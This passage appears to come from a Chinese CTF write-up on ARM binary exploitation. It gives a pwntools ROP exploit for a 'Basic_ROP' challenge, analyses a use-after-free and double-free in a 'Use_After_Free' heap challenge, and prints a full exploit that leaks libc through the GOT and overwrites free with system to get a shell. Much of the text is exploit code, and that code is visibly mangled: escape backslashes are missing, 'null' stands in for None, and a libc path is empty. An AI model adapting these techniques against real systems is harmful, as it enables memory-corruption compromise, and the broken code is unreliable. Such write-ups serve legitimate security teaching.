    context.log_level='debug'
    context.arch='arm'
    Basic_ROP=ELF('./Basic_ROP', checksec = False)
    libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif False:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Basic_ROP"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Basic_ROP"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    if __name__ == "__main__":
        sh = get_sh()
        payload  =  'x41' * 0x40 + p32(Basic_ROP.bss(0x500)) + p32(0x000103F8)      # Padding + return_addr
        payload +=  p32(Basic_ROP.bss() + 0x500 - 0x4 * 3)         # R3
        payload +=  p32(0x0001065C)                       # PC
        sh.recvuntil('Give me data to dump:')
        sh.sendline(payload)
        payload  =  '/bin/shx00'                   
        payload +=  p32(Basic_ROP.bss() + 0x500 + 0x120 - 0x4 * 4) # R11
        payload +=  p32(0x000103F8)                               # return_addr
        payload +=  p32(Basic_ROP.bss() + 0x500 - 0x10 + 0x4)     # R3
        payload +=  p32(0x0001062C)                            # PC
        payload +=  'x00' * 0x100
        payload +=  p32(0xDeadbeef)                            # R11
        payload +=  p32(0x00010574)                            # return_addr
        # payload +=  p32(Basic_ROP.plt['system'])                            # return_addr
        sh.sendline(payload)
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  以Use_After_Free为例 —— 堆利用实例
####  程序分析
程序为ARM-32-dynamically linked程序。
####  分析题目逻辑&探测漏洞点
首先使用IDA尝试分析，发现程序逻辑较为混乱，无法顺利的理清楚。
#####  探测UAF漏洞
那么我们首先尝试运行，
发现是一个常见的表单题，除了常见的增删改查以外还提供了很多选项，但令我们很在意的是，程序在增删改查时，提供了`alias`作为索引！那么推测我们如果按index释放后是否没有把alias索引清空，经过测试，果然发现存在`Use-After-Free`漏洞！
#####  探测Double Free漏洞
接下来我们尝试触发double free漏洞
验证存在！
#####  分析数据结构
此处我们使用动态调试的方式，因为远程调试的原因导致我们的heap命令无法使用，于是我们在menu处下断，然后查看teams数组内的内容，就可以看到每个成员的情况。
此处我们可以分析出，程序会直接申请一个大小为0x3C大小的Chunk用于存放name，并在name的最后四字节放上Description的chunk的data域指针，Description会根据我们的输入大小进行分配，然后程序会再分配一个大小为0x14的Chunk，分别存放name的chunk的data域指针，Alias。
这一点也可以在静态分析中得到佐证：
#####  Delete函数分析
对delete函数静态分析后也可以佐证我们之前的探测。
#####  Edit 函数分析——另一个free的机会！
也就是说，如果我们更新的Description若更长，程序会free掉旧的，malloc一个更长的Chunk。
####  漏洞利用
那么我们其实可以很容易的分析出，若我们能控制name这个chunk的最后四字节，我们事实上拥有了一个任意地址读写的能力！
####  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='arm'
    Use_After_Free=ELF('./Use_After_Free', checksec = False)
    libc=ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./libc-2.24.so", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif False:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabihf", "./Use_After_Free"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./Use_After_Free"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def creat(sh,Chunk_alias,Team,Desc):
        sh.recvuntil(': ')
        sh.sendline('add' + ' ' + Chunk_alias)
        sh.recvuntil('Team: ')
        sh.sendline(Team)
        sh.recvuntil('Desc: ')
        sh.sendline(Desc)
    def delete(sh,index=null,Chunk_alias=null):
        sh.recvuntil(': ')
        if Chunk_alias != null:
            sh.sendline('del' + ' ' + Chunk_alias)
        else:
            sh.sendline('del')
            sh.recvuntil('Index: ')
            sh.sendline(str(index))
    def show(sh,index=null,Chunk_alias=null):
        sh.recvuntil(': ')
        if Chunk_alias != null:
            sh.sendline('show' + ' ' + Chunk_alias)
        else:
            sh.sendline('show')
            sh.recvuntil('Index: ')
            sh.sendline(str(index))
    def edit(sh,Team,Desc,Point,index=null,Chunk_alias=null):
        sh.recvuntil(': ')
        if Chunk_alias != null:
            sh.sendline('edit' + ' ' + Chunk_alias)
        else:
            sh.sendline('edit')
            sh.recvuntil('Index: ')
            sh.sendline(str(index))
            sh.recvuntil('Team: Team: ')
            sh.sendline(Team)
            sh.recvuntil('Desc: ')
            sh.sendline(Desc)
            sh.recvuntil('Points: ')
            sh.sendline(str(Point))
    if __name__ == "__main__":
        sh = get_sh(True)
        creat(sh,'Chunk__0','Chunk__0','A' * (0x20 - 1))
        creat(sh,'Chunk__1','Chunk__1','A' * (0x20 - 1))
        creat(sh,'Chunk__2','Chunk__2','A' * (0x20 - 1))
        creat(sh,'Chunk__3','/bin/shx00','/bin/shx00')
        delete(sh,1)
        edit(sh,'Chunk__2','A' * 0x38 + p32(Use_After_Free.got['free']),2,2)
        show(sh,1,'Chunk__1')
        sh.recvuntil('  Desc:  ')
        libc_base = u32(sh.recv(4)) - libc.symbols['free']
        success('We get libc base address is ' + str(hex(libc_base)))
        sh.recvuntil(': ')
        sh.sendline('edit' + ' ' + 'Chunk__1')
        sh.recvuntil('Team: ')
        sh.sendline('Chunk__1')
        sh.recvuntil('Desc: ')
        sh.sendline(p32(libc_base + libc.symbols['system']) + p32(libc_base + libc.symbols['fgets']))
        sh.recvuntil('Points: ')
        sh.sendline(str(1))
        delete(sh,3)
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
## 0x05 后记
可以看出，ARM架构下的pwn利用大多数还是利用了Intel32/AMD64架构下的利用思想，只要理解并掌握了ARM架构指令集的变化，利用还是相对容易的，此处的题目没有展示更深的利用技巧(例如：栈喷射、堆喷射、条件竞争等)，这些技巧可能会在我的下一篇文章中给与展示，同时接下来我将会去尝试总结MIPS架构下的PWN利用技巧~
## 0x06 参考链接
[arm64程序调用规则 – maniac_kk](https://juejin.im/post/5d14623ef265da1bb47d7635)
[如何 pwn 掉一个 arm 的binary – m4x](https://m4x.fun/post/how-2-pwn-an-arm-binary/)
[ARM汇编指令-STMFD和LDMFD –
行走的红茶](https://blog.csdn.net/weiwei_xiaoyu/article/details/20563479)
[ARM汇编编程规则 – Arrow](https://blog.csdn.net/MyArrow/article/details/9665513)
[ARMv8-AArch64寄存器和指令集](https://blog.csdn.net/tanli20090506/article/details/71487570)
[ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用](https://www.freebuf.com/articles/terminal/107276.html)
[Mac下安装qemu并模拟树莓派操作系统 –
gogogogo彬](https://blog.csdn.net/qq_40640958/article/details/89048551)
[Rootme CTF UAF Writeup](https://www.ms509.com/2018/03/23/Rootme-uaf-writeup/)